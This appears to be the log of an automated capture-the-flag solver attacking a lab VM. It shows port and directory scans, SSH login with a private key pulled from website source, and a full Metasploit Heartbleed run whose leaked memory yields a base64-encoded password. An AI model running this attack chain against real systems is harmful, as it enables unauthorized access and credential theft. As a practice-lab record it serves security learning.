@@ -1,0 +1,95 @@
+Scanning for open ports on the target VM...
+Host : 10.200.33.61 ()
+Scanning for open ports on 10.200.33.61...
+Flag found on port 1574
+✓ First Flag ->  flag1{Don't_be_a_phishing_victim}
+
+Let's go for the next flag...
+
+No Flag on port 1584
+No Flag on port 1594
+No Flag on port 1604
+No Flag on port 1614
+No Flag on port 1624
+Running dirb scan on the target VM...
+
+...
+
+Dirb scan finished.
+Discovered URL: http://10.200.33.61:1574/cd
+✓ Second Flag ->  flag2{The_best_way_to_learn_about_cybersecurity_is_to_break_things}
+
+
+Private key found in the source code of the website, saving to file...
+Private key saved to file: key1.key
+Connecting to the target VM using SSH...
+ssh -i key1.key ns@10.200.33.61
+✓ Connected to the target VM as user: ns
+✓ Third Flag ->  flag3{Error_404:_flag_not_found}
+
+
+Port 1584 on 10.200.33.61 returned a 400 response - Vulnerability detected!
+Initializing Metasploit for Heartbleed vulnerability exploitation...
+Metasploit execution completed successfully.
+Analyzing output to extract and decode the password...
+Metasploit Output:
+[*] Processing Bits.rc for ERB directives.
+resource (Bits.rc)> use auxiliary/scanner/ssl/openssl_heartbleed
+resource (Bits.rc)> set RHOST 10.200.33.61
+RHOST => 10.200.33.61
+resource (Bits.rc)> set RPORT 1584
+RPORT => 1584
+resource (Bits.rc)> set verbose true
+verbose => true
+resource (Bits.rc)> run
+[*] 10.200.33.61:1584     - Leaking heartbeat response #1
+[*] 10.200.33.61:1584     - Sending Client Hello...
+[*] 10.200.33.61:1584     - SSL record #1:
+[*] 10.200.33.61:1584     -     Type:    22
+[*] 10.200.33.61:1584     -     Version: 0x0301
+[*] 10.200.33.61:1584     -     Length:  86
+[*] 10.200.33.61:1584     -     Handshake #1:
+[*] 10.200.33.61:1584     -             Length: 82
+[*] 10.200.33.61:1584     -             Type:   Server Hello (2)
+[*] 10.200.33.61:1584     -             Server Hello Version:           0x0301
+[*] 10.200.33.61:1584     -             Server Hello random data:       662bcabb1fb108f06b404e0f5afeac0059b34987cf350c32facf644366b4b1f3
+[*] 10.200.33.61:1584     -             Server Hello Session ID length: 32
+[*] 10.200.33.61:1584     -             Server Hello Session ID:        86c5d1a7ed5f32ebb746a2da01baf313c598c20547ed66b299f8d04882a797b5
+[*] 10.200.33.61:1584     - SSL record #2:
+[*] 10.200.33.61:1584     -     Type:    22
+[*] 10.200.33.61:1584     -     Version: 0x0301
+[*] 10.200.33.61:1584     -     Length:  624
+[*] 10.200.33.61:1584     -     Handshake #1:
+[*] 10.200.33.61:1584     -             Length: 620
+[*] 10.200.33.61:1584     -             Type:   Certificate Data (11)
+[*] 10.200.33.61:1584     -             Certificates length: 617
+[*] 10.200.33.61:1584     -             Data length: 620
+[*] 10.200.33.61:1584     -             Certificate #1:
+[*] 10.200.33.61:1584     -                     Certificate #1: Length: 614
+[*] 10.200.33.61:1584     -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=www.yoursite.com,OU=YourDepartment,O=YourCompany>, issuer=#<OpenSSL::X509::Name CN=www.yoursite.com,OU=YourDepartment,O=YourCompany>, serial=#<OpenSSL::BN:0x00007182fe5e9c08>, not_before=2024-04-12 06:17:07 UTC, not_after=2044-04-07 06:17:07 UTC>
+[*] 10.200.33.61:1584     - SSL record #3:
+[*] 10.200.33.61:1584     -     Type:    22
+[*] 10.200.33.61:1584     -     Version: 0x0301
+[*] 10.200.33.61:1584     -     Length:  203
+[*] 10.200.33.61:1584     -     Handshake #1:
+[*] 10.200.33.61:1584     -             Length: 199
+[*] 10.200.33.61:1584     -             Type:   Server Key Exchange (12)
+[*] 10.200.33.61:1584     - SSL record #4:
+[*] 10.200.33.61:1584     -     Type:    22
+[*] 10.200.33.61:1584     -     Version: 0x0301
+[*] 10.200.33.61:1584     -     Length:  4
+[*] 10.200.33.61:1584     -     Handshake #1:
+[*] 10.200.33.61:1584     -             Length: 0
+[*] 10.200.33.61:1584     -             Type:   Server Hello Done (14)
+[*] 10.200.33.61:1584     - Sending Heartbeat...
+[*] 10.200.33.61:1584     - Heartbeat response, 65535 bytes
+[+] 10.200.33.61:1584     - Heartbeat response with leak, 65535 bytes
+[*] 10.200.33.61:1584     - Printable info leaked:
+......9.TzCD.r..................password=ZDJseVpXeGxjM01o HTTP/1.1..Host: 10.200.33.61:1584..User-Agent: curl/7.81.0..Accept: */*....<....L...:...H-I.a,...........Ke....e.y..._M.F5./.....o*B...E..4.......1.....0.................................................+............-.....3.&.$... ...0.z.8.....;...........{1.D-A..................................................................................................................................................................................................0...U.#..0......nE.=.....?_.V..4.0...U....0....0...*.H...........././I.xsh....gcP:%..r.X..N.......?..&.o...g..C.-....Gk]..8.._ .K....&/o..`.Jt...SK........s..m7..Z..3G1.3................B./...lk............A.a..5c1....&O.z...+...'.B.;_.>.4"...I..5.*.....`8.....>juh...L.....aUC.l.......d4..p...8=JgV.}gO9..?.jt.4.....e...qc...s.-........z.n...]..Fm..A${.p...X.....}...\!gI........:..cKK.GO..k..E.2.N.N..................................................................................................................................... repeated 15189 times .....................................................................................................................................@.......W.........@...agM.....agM...p....U..p....U..................................................................................................................................... repeated 16091 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................Q.......pX...U....Z.x,..<.j(L...H#P.............password=ZDJseVpXeGxjM01o HTTP/1.1..Host: 10.200.33.61:1584..User-Agent: curl/7.81.0..Accept: */*.....Q..._Uo...2...}...............;...6V.U.y..........6i.........d[.......1.....0.................................................+............-.....3.&.$... Z).@P.<...~lzS..j.i&.&..g:..~q..................................................................................................................................................................................................).y...M.d...r.q.p.H.b.3.o.8.m.l...k.j...g.f...e.....a.V...U.z.].....Y.X.W.V.....N.g...K.I...G...F.T.?.E.D.B.A.@.5.....;.k...6.?.).2.1.,.+.4.....$.....[.(.l.....................9.....@.............U.|.....m...r.3...-.S..... .........u.t.........[...y.x.s.....M.X.`.B.K...!.9...*.%.#. .....................................................]..Fm..A${.p...X.....}...\!gI........:..cKK.GO..k..E.2.N.N..................................................................................................................................... repeated 14879 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................@.......W........agM.....agM...p....U..p....U..................................................................................................................................... repeated 15744 times .....................................................................................................................................
+[*] 10.200.33.61:1584     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (Bits.rc)> exit
+
+Password decoded: wireless!
+Fourth Flag -> flag4{I_put_the_'I'_in_security}
+Flags have been obtained!, Happy Hacking !!!
